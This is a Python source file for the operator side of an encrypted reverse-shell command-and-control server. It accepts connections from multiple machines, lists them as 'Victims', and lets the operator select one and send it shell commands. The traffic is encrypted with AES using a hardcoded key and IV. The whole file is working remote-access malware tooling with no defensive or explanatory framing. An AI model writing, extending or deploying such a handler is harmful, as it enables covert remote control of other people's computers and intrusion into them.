import socket
import threading
from queue import Queue
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding


IV=b"@#H~/*-+*GFB}{:<"  #initialisation vector
key=b"!%^$GCV*&():'/.hdc=\/*-9650...32"# # aes key


number_of_threads= 2
job_number=['handler','shell']
queue = Queue()
all_connections=[] #stores connections from s.accept()
all_addresses=[] # stores ip an port number from s.accept()

def socket_create():
    try:
        host='localhost'
        port =9999
        global  s
        s=socket.socket() 
        s.bind((host,port))
        s.listen(5)
        #print("[+] Listening for incoming TCP connections on Port 9999 ")
        
    except socket.error as msg:
        print("Socket creation error: "+str(msg))


#accept connections from multiple clients and save them to list
def accept_connections():
    for c in all_connections: #closes all existing connections
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn,address=s.accept()
            conn.setblocking(1) # to remove timeout problem (peramanent connection)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection Established: "+address[0])
        except:
            pass

#interactive Prompt for sending commands remotely
def start_shell():
    while True:
        cmd=input('Shell > ')
        if cmd =='list': #to list available connections
            list_connections()
        elif 'select' in cmd: # to select a connection
            conn=get_target(cmd)
            if conn is not None: # to bypass the error 
                send_target_commands(conn)
        else:
            print("Command not recognised")

        
def list_connections():
    result=''
    
    for i,conn in enumerate(all_connections):
        try:
            msg=b" "
            conn.send(encrypt(msg)) #just to check whether the connection is nt broken over period of time
            conn.recv(20480)
        except:
            del all_connections[i]  #delete that faulty connection
            del all_addresses[i]
            continue
        result+= str(i) + '   ' +str(all_addresses[i][0]) +'   ' + str(all_addresses[i][1]) +'\n'
    print("----------Victims--------",'\n'+ result)   

def get_target(cmd):  #select a target
    try:
        target = cmd.replace('select ','')
        target=int(target)
        conn=all_connections[target]
        print("You are now connected to ",str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) +'> ',end='')
        return conn #returns the connection object
    except:
        print("Not a vaid connection")
        return None

def send_target_commands(conn):  #connect with remote target client
    while True:
        try:
            cmd=input()
            msg=encrypt(cmd.encode())
            # print(msg)
            if len(cmd)>0 :
                conn.send(msg)
                client_response=(conn.recv(20480))
                rec_msg=decrypt(client_response)
                print(rec_msg.decode(),end="")
            if cmd=='quit':
                break
        except:
            print("Connection was lost ")
            break

###@@@@@----------------AES ENCRYPTION---------------------@@@@@@###        
def encrypt(message):
    encryptor=AES.new(key,AES.MODE_CBC,IV)
    padded_message=Padding.pad(message,16)
    encrypted_message=encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor=AES.new(key,AES.MODE_CBC,IV)
    decrypted_padded_message=decryptor.decrypt(cipher)
    decrypted_message=Padding.unpad(decrypted_padded_message,16)
    return decrypted_message 


#creating threads via loops
def create_threads():
    for _ in range(number_of_threads): #error has to be fixed
        t=threading.Thread(target=work) # creating a thread and assigning it a function work()
        t.daemon=True #shutdown thread when the main function ends or program ends
        t.start()

# do the next job in the queue
def work():
    while True:
        x=queue.get()
        if x=='handler':
            socket_create()
            accept_connections()
        if x=='shell':
            start_shell()
        queue.task_done()  # to free up the memory

#each list item is a net job
def create_jobs():
    for x in job_number:
        queue.put(x) #human readable list to thread readable queue
    queue.join()


if __name__=="__main__":
    print("*****Plzzz don't create a new process in any target machine***** ")
    create_threads()
    create_jobs()


    



